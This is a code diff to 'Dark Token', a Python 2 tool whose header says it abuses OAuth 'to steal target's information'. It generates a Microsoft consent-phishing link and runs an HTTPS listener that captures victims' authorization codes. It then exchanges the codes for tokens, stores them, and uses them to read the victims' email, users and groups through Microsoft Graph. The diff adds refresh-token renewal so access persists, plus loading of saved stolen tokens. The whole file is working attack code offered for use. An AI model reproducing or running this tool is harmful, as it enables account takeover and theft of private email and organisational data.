@@ -1,9 +1,9 @@
 #!/usr/local/bin/python
 
-# Dark Token 
+# Dark Token
 # Written By: Mr. V (Ring0Labs)
 
-# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information. 
+# Dark Token, leveraging the open authentication protocol (oauth) to steal target's information.
 
 ##########################################################################
 # Dark Token                                                             #
@@ -18,15 +18,15 @@
 #                                                                        #
 ##########################################################################
 
-# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; 
-# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
+# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+# without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 # See the GNU General Public License for more details.
 
 # Please don't use it for bad things!
 
 """
-Requirements: 
-valid cert.pem, key.pem. 
+Requirements:
+valid cert.pem, key.pem.
 create an app at apps.dev.microsoft.com, platform must be web.
 """
 # https://outlook.office365.com/
@@ -42,7 +42,7 @@ from os import system
 
 SIGNAL = ''
 global EMAILDOMAIN
-global TOKENS
+global TOKENS; TOKENS = [];
 global HTTPD
 API = {
 	'base': 'https://graph.microsoft.com/',
@@ -63,6 +63,9 @@ CERT_CONFIG = {
 	'keyfile': 'key.pem',
 	'certfile': 'cert.pem'
 }
+DEBUG = {
+	'debug': 0,
+}
 
 help = """
 
@@ -70,11 +73,13 @@ help = """
 
 start server         - To start Dark Token server.
 stop server          - To stop Dark Token server.
+renew tokens         - To renew all tokens.
 list tokens          - To list all tokens.
-list message ID      - To list email messages from a specific account.
+list messages ID     - To list email messages from a specific account.
 list users ID        - To list users of the target organization.
 list groups ID       - To list groups of the target organization.
 list my groups ID    - To list assigned groups of the current account.
+set debug [0|1]      - To enable debug output
 clear                - To clear screen.
 
 [App Configuration]
@@ -99,10 +104,32 @@ class colors:
 	blue = '\x1b[0;34;40m'
 	end = '\x1b[0m'
 
+import ConfigParser
+if os.path.isfile('autorun.cfg'):
+	configParser = ConfigParser.RawConfigParser()
+	configFilePath = r'autorun.cfg'
+	configParser.read(configFilePath)
+	if configParser.get('app-config', 'client_id'):
+		APP_CONFIG['client_id'] = configParser.get('app-config', 'client_id')
+	if configParser.get('app-config', 'client_secret'):
+		APP_CONFIG['client_secret'] = configParser.get('app-config', 'client_secret')
+	if configParser.get('app-config', 'redirect_uri'):
+		APP_CONFIG['redirect_uri'] = configParser.get('app-config', 'redirect_uri')
+	if configParser.get('token-config', 'account'):
+		TOKENS.append([
+			configParser.get('token-config', 'account'),
+			configParser.get('token-config', 'access_token'),
+			configParser.get('token-config', 'id_token'),
+			configParser.get('token-config', 'refresh_token'),
+			configParser.get('token-config', 'CLIENT_IP')
+		])
+
 class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
 		url_params = urlparse(self.path).query
 		if url_params:
+			if not DEBUG['debug'] == 0:
+				print url_params
 			auth_code = parse_qs(url_params)['code'][0]
 			if auth_code:
 				global CLIENT_IP
@@ -120,7 +147,7 @@ class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_POST(self):
 		global HTTPD
 		if self.path.startswith('/shutdown'):
-			print '[!] Shutting down Dark Token Server...'	
+			print '[!] Shutting down Dark Token Server...'
 			def stop_server(server):
 				server.shutdown()
 				server.server_close()
@@ -132,7 +159,7 @@ def httpRequest(url, payload, access_token_authorization_bearer=None, method='PO
 
 	if access_token_authorization_bearer:
 		headers['Authorization'] = 'Bearer ' + access_token_authorization_bearer
-	
+
 	url_parsed = urlparse(url)
 
 	conn = httplib.HTTPSConnection(url_parsed.hostname, context=context)
@@ -157,6 +184,23 @@ def get_access_token(code):
 	account = get_account_profile(res_json['access_token'])
 	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
 
+def refresh_access_token(refresh_token):
+	payload = {
+		'grant_type': 'refresh_token',
+ 		'client_id': APP_CONFIG['client_id'],
+		'client_secret': APP_CONFIG['client_secret'],
+		'refresh_token': refresh_token
+		}
+
+	payload.update(APP_CONFIG)
+	resp = httpRequest('https://login.windows.net/common/oauth2/v2.0/token', payload)
+	resp_body = resp.read()
+	if not DEBUG['debug'] == 0:
+		print resp_body
+	res_json = json.loads(resp_body.decode('utf-8'))
+	account = get_account_profile(res_json['access_token'])
+	store_token(account, res_json['access_token'], res_json['id_token'], res_json['refresh_token'])
+
 def get_account_profile(access_token):
 	global EMAILDOMAIN
 	resp = httpRequest(API['base']+API['profile'], '', access_token, 'GET')
@@ -171,39 +215,54 @@ def get_account_messages(access_token):
 	resp = httpRequest(API['base']+API['message'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_users(access_token):
 	resp = httpRequest(API['base']+API['users'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_groups(access_token):
 	resp = httpRequest(API['base']+API['groups'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
 
 def get_mygroups(access_token):
 	resp = httpRequest(API['base']+API['mygroups'], '', access_token, 'GET')
 	resp_body = resp.read()
 	res_json = json.loads(resp_body.decode('utf-8'))
-	return res_json
-	
+	if not DEBUG['debug'] == 0:
+		return resp_body
+	else:
+		return res_json
+
 def start_server():
 	global HTTPD
 	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
 		print '[!] Please check your app config.'
-	else:
-		try:
-			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
-			print '[!] Starting Dark Token Server...'
-			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
-			HTTPD.serve_forever()
-		except:
-			print '[!] Server is already started.'
-	
+        else:
+                if not os.path.isfile(CERT_CONFIG['certfile']) or not os.path.isfile(CERT_CONFIG['keyfile']):
+                        print "[!] Unable to find %s or %s" % (CERT_CONFIG['certfile'], CERT_CONFIG['keyfile'])
+                else:
+                        try:
+                                HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
+                                print '[+] Starting Dark Token Server...'
+                                HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
+                                HTTPD.serve_forever()
+                        except:
+                                print '[!] Server is already started.'
+
 def stop_server():
 	try:
 		httpRequest('https://127.0.0.1/shutdown', '', context=ssl._create_unverified_context())
@@ -211,11 +270,11 @@ def stop_server():
 		pass
 
 def store_token(account, access_token, id_token, refresh_token):
-	global TOKENS
-	TOKENS = []
+	#global TOKENS
+	#TOKENS = []
 	TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
 
-print '[!] Starting Dark Token...'
+print '[+] Starting Dark Token...'
 
 while True:
 	SIGNAL = raw_input('[*]> ')
@@ -223,21 +282,38 @@ while True:
 		thread.start_new_thread(start_server, ())
 	elif SIGNAL.__contains__('stop server'):
 		stop_server()
+	elif SIGNAL.__contains__('renew tokens'):
+		print '[+] Trying To Renw Available Tokens:'
+		try:
+			for i in range(len(TOKENS)):
+				refresh_access_token(TOKENS[i-1][3])
+			pass
+		except NameError:
+			print '[!] 0 tokens found in the database.'
+			pass
 	elif SIGNAL.__contains__('list tokens'):
-		print '[!] Listing Available Tokens:'
+		print '[+] Listing Available Tokens:'
 		try:
 			for i in range(len(TOKENS)):
 				print colors.allwhite + '-' * int(columns) + colors.end
-				print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
-				print 'Access_Token: ' + TOKENS[i-1][1]
-				print 'Client IP: ' + TOKENS[i-1][4]
+				#print 'ID = [' + str(i) + '] - Account: ' + TOKENS[i][0]['userPrincipalName']
+				print 'ID = [%i] - Account: %s' % (i, TOKENS[i][0])
+				print 'Access_Token: %s' % TOKENS[i-1][1]
+				print 'ID_Token: %s' % TOKENS[i-1][2]
+				print 'Refresh_Token: %s' % TOKENS[i-1][3]
+				print 'Client IP: %s' % TOKENS[i-1][4]
 		except NameError:
 			print '[!] 0 tokens found in the database.'
 			pass
 	elif SIGNAL.__contains__('list users'):
-		id = SIGNAL.split()[2]
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list users 0'
 		try:
 			users = get_users(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print users
 			for i in range(len(users['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print colors.white + 'Display Name: ' + str(users['value'][i]['displayName']) + colors.end
@@ -250,27 +326,42 @@ while True:
 		except:
 			print '[!] 0 users found in the database.'
 	elif SIGNAL.__contains__('list groups'):
-		id = SIGNAL.split()[2]
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list groups 0'
 		try:
 			groups = get_groups(TOKENS[int(id)][1])
-			for i in range(len(groups['value'])):
-				print colors.allwhite + '-' * int(columns) + colors.end
-				print color.white + str(groups['value'][i])
-		except:
-			print '[!] 0 groups found in the database.' 
-	elif SIGNAL.__contains__('list my groups'):
-		id = SIGNAL.split()[3]
-		try:
-			groups = get_mygroups(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print groups
 			for i in range(len(groups['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print color.white + str(groups['value'][i])
 		except:
 			print '[!] 0 groups found in the database.'
-	elif SIGNAL.__contains__('list message'):
-		id = SIGNAL.split()[2]
+	elif SIGNAL.__contains__('list my groups'):
+		try:
+			id = SIGNAL.split()[3]
+		except:
+			print '[!] You must specify an array id.  E.g., list my groups 0'
+		try:
+			groups = get_mygroups(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print groups
+			for i in range(len(groups['value'])):
+				print colors.allwhite + '-' * int(columns) + colors.end
+				print color.white + str(groups['value'][i])
+		except:
+			print '[!] 0 groups found in the database.'
+	elif SIGNAL.__contains__('list messages'):
+		try:
+			id = SIGNAL.split()[2]
+		except:
+			print '[!] You must specify an array id.  E.g., list messages 0'
 		try:
 			msg = get_account_messages(TOKENS[int(id)][1])
+			if not DEBUG['debug'] == 0:
+				print msg
 			for i in range(len(msg['value'])):
 				print colors.allwhite + '-' * int(columns) + colors.end
 				print colors.blue + 'Subject: ' + msg['value'][i]['subject'] + colors.end
@@ -298,6 +389,9 @@ while True:
 	elif SIGNAL.__contains__('set redirect_uri'):
 		redirect_uri = SIGNAL.split()[2]
 		APP_CONFIG['redirect_uri'] = redirect_uri
+	elif SIGNAL.__contains__('set debug'):
+		debug = SIGNAL.split()[2]
+		DEBUG['debug'] = debug
 	elif SIGNAL.__contains__('generate link'):
 		try:
 			print "\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=%s&response_type=code&redirect_uri=%s&response_mode=query&scope=%s&state=12345\n" % (str(APP_CONFIG['client_id']), urllib.quote(APP_CONFIG['redirect_uri']), urllib.quote(APP_CONFIG['scope']))
